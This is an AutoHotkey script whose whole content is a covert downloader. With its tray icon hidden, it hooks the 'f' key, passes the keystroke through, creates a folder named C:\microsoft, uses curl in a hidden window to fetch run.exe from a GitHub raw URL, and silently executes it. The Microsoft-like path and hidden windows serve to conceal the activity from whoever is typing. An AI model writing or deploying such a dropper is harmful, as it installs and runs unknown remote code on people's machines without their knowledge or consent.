#SingleInstance Ignore
#NoTrayIcon

^Esc::ExitApp

$f::{
    path := "C:\microsoft"
    Send "f"

    static lastRun := 0
    delay := 2000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    if (DirExist(path)) {
        if (FileExist(path "\run.exe")) {
            Run "run.exe"
        } else {
            output := path "\run.exe"
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    } else {
        DirCreate(path)
        output := path "\run.exe"
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        RunWait command, , "Hide"
        Run output, , "Hide"
    }
}
